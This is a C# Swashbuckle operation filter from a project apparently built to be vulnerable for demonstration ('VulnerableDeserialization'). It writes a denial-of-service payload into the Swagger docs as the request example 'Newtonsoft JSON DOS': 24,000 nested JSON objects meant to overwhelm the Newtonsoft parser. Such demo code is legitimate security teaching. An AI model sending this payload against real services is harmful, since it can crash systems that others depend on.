using Microsoft.OpenApi.Any;
using Microsoft.OpenApi.Models;
using Swashbuckle.AspNetCore.SwaggerGen;
using System.Collections.Generic;
using System.Linq;

namespace VulnerableDeserialization
{
    public class SwaggerJSONOperationFilter : IOperationFilter
    {
        public void Apply(OpenApiOperation operation, OperationFilterContext context)
        {
            var swaggerJSONAttribute = context.MethodInfo.GetCustomAttributes(true)
               .SingleOrDefault((attribute) => attribute is SwaggerJSONAttribute) as SwaggerJSONAttribute;
            if (swaggerJSONAttribute != null)
            {
                int nRep = 24000;
                string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
                              string.Concat(Enumerable.Repeat("}", nRep));

                operation.RequestBody = new OpenApiRequestBody();
                operation.RequestBody.Content.Add(swaggerJSONAttribute.MediaType, new OpenApiMediaType()
                {
                    Schema = new OpenApiSchema()
                    {
                        Type = "string"
                    },
                    Examples = new Dictionary<string, OpenApiExample>()
                    {
                           { "Newtonsoft JSON DOS",
                            new OpenApiExample() {
                              Value = new OpenApiString(json)
                            }
                        }
                    }

                });
            }
        }
    }
}
